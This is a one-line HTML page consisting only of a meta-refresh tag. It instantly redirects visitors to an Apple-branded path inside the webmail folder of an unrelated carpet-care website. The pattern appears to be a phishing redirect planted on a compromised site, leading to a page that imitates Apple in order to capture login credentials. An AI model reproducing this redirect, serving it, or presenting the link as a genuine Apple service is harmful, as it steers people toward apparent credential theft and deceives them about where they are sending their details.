<META http-equiv="refresh" content="0;URL=http://smartcarpetcare.net/webmail/apple-services/Apple/">
